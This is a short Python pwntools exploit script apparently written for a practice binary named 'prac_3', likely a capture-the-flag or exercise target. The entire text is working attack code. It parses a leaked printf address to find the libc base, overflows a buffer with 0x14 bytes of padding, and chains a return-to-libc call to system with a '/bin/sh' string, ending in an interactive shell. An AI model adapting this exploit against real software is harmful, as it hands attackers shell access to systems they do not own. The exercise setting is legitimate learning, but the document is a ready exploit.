from pwn import *

context.log_level = 'critical'

p = process('./prac_3')

p.recvuntil(b'k: ')
# it leaks the address of printf()
base = int(p.recvline(), 16) - 0x58710

payload = b'A' * 0x14
payload += p32(base + 0x47bf0) # system()
payload += p32(0xdeadbeef) # return address for system()
payload += p32(base + 0x1c0143) # bin/sh 

p.sendline(payload)
p.interactive()
p.close()
